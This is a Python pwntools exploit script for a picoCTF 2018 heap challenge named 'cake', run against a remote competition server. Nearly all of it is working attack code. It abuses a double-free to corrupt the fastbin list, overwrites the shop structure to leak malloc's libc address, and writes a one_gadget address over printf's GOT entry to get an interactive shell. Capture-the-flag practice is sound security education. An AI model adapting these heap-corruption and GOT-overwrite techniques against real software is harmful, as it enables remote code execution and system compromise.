from pwn import *

e = ELF("./cake")
libc = ELF("./libc.so.6")
#p = process(e.path, env={"LD_PRELOAD": libc.path})
p = remote("2018shell.picoctf.com", 36275)
'''
Shop
[ money ]
[ customers ]
[ cake_0x00 ]
   ...
[ cake_0x10 ]

Cake
[ price ]
[ name -> 7 * chr + "\x00" ]

'''
def alloc(p, price=0, name="A"):
  p.clean()
  p.sendline("M")
  p.recvuntil("Made cake ")
  
  idx = p.recvline().split(".")[0]
  p.sendlineafter(">", name.ljust(7, "\x00"))
  p.sendlineafter(">", str(price))
  print("Created cake {} with name {}".format(idx, name))

  return idx

def free(p, name):
  p.clean()
  p.sendline("S")
  p.sendlineafter(">", name)

# Make money 0x20
header = alloc(p, 0x20)
free(p, header)

A = alloc(p)
B = alloc(p)
C = alloc(p)

A2 = alloc(p)
B2 = alloc(p)
C2 = alloc(p)

free(p, A)
free(p, B)
free(p, A)

D = alloc(p, e.symbols["shop"] - 8)
E = alloc(p)
F = alloc(p)

G = alloc(p, e.symbols["shop"] - 8 + 1, p64(e.got["malloc"]))

print("Overwrote shop[0] at {0:#x} with {0:#x}".format(e.symbols["shop"] + 8 * 2, e.got["malloc"]))

p.clean()
p.sendline("I")
p.sendlineafter(">", "0")
p.recvuntil("is being sold for $")

leak = int(p.recvline(keepends=False))
libc_base = leak - libc.symbols["malloc"]

print("Libc base: {0:#x}".format(libc_base))
print("Malloc hook: {0:#x}".format(libc_base + libc.symbols["__malloc_hook"]))


free(p, A2)
free(p, B2)
free(p, A2)

D2 = alloc(p, e.symbols["shop"] - 8)
E2 = alloc(p)
F2 = alloc(p)

G2 = alloc(p, 0, p64(0))

one_gadget = 0x45216
fin = alloc(p, libc_base + one_gadget, p64(e.got["printf"]))

p.interactive()
